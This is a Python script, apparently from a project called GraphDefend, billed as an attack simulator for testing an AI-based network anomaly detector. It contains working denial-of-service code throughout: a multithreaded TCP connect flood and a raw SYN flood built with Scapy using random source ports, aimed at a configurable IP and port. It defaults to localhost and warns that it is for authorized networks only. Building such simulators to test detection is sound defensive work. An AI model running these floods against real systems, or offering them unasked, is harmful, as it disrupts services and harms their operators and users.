import socket
import threading
import time
import argparse
import sys

try:
    from scapy.all import IP, TCP, send, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

def print_banner():
    print("""
=========================================================
      GRAPHDEFEND: ZERO-TRUST ATTACK SIMULATOR
=========================================================
WARNING: Use only on authorized networks (localhost demo).
This tool generates aggressive network anomalies to test
the Sentinel AI / PyTorch detection pipeline.
=========================================================
    """)

# 1. TCP Connect Flood (Works everywhere, no root required)
def tcp_connect_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    packets_sent = 0
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            # Send garbage to cause processing anomalies
            s.send(b"GET /login HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
            packets_sent += 1
        except Exception:
            pass
    return packets_sent

# 2. SYN Flood (Requires Scapy + Root privileges)
def syn_flood(target_ip, target_port, duration):
    if not SCAPY_AVAILABLE:
        print("[-] Scapy not installed. Falling back to TCP Connect Flood.")
        return 0

    print(f"[!] Launching Raw SYN Flood against {target_ip}:{target_port} (Requires Root/Sudo)")
    timeout = time.time() + duration
    packets_sent = 0
    
    while time.time() < timeout:
        try:
            # Craft raw IP + TCP SYN packet with random source ports
            ip_layer = IP(dst=target_ip)
            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S", seq=1000, window=1000)
            pkt = ip_layer / tcp_layer
            send(pkt, verbose=0)
            packets_sent += 1
        except PermissionError:
            print("\n[!] FATAL: Generating raw SYN packets requires 'sudo'. Run script with sudo or use --mode tcp")
            sys.exit(1)
        except Exception as e:
            pass
            
    return packets_sent

def attack_worker(thread_id, mode, target_ip, target_port, duration, stats):
    if mode == "syn":
        sent = syn_flood(target_ip, target_port, duration)
    else:
        sent = tcp_connect_flood(target_ip, target_port, duration)
    
    stats[thread_id] = sent

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GraphDefend Local Attack Demo")
    parser.add_argument("--ip", type=str, default="127.0.0.1", help="Target IP Address (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=3001, help="Target Port (default: Node server 3001)")
    parser.add_argument("--threads", type=int, default=15, help="Number of concurrent attack threads")
    parser.add_argument("--duration", type=int, default=10, help="Duration of attack burst in seconds")
    parser.add_argument("--mode", type=str, choices=["tcp", "syn"], default="tcp", help="Attack mode: 'tcp' (no root) or 'syn' (requires root/scapy)")
    
    args = parser.parse_args()
    print_banner()

    print(f"[*] Attacking Target : {args.ip}:{args.port}")
    print(f"[*] Attack Mode      : {args.mode.upper()} Flood")
    print(f"[*] Intensity        : {args.threads} Threads")
    print(f"[*] Duration         : {args.duration} Seconds")
    
    print("\n[3] ⏳ Firing in 3...")
    time.sleep(1)
    print("[2] ⏳ Firing in 2...")
    time.sleep(1)
    print("[1] ⏳ Firing in 1...")
    time.sleep(1)
    print("🔥 ATTACK LAUNCHED! Check the React Dashboard! 🔥\n")

    threads = []
    stats = {}
    
    # Launch threads
    for i in range(args.threads):
        t = threading.Thread(target=attack_worker, args=(i, args.mode, args.ip, args.port, args.duration, stats))
        threads.append(t)
        t.start()

    # Wait for completion
    for t in threads:
        t.join()

    total_requests = sum(stats.values())
    print(f"\n[+] Attack Complete.")
    print(f"[+] Total packets/requests fired: ~{total_requests}")
    print("[+] Check MongoDB and the Next.js Dashboard to see if the anomaly was caught.")
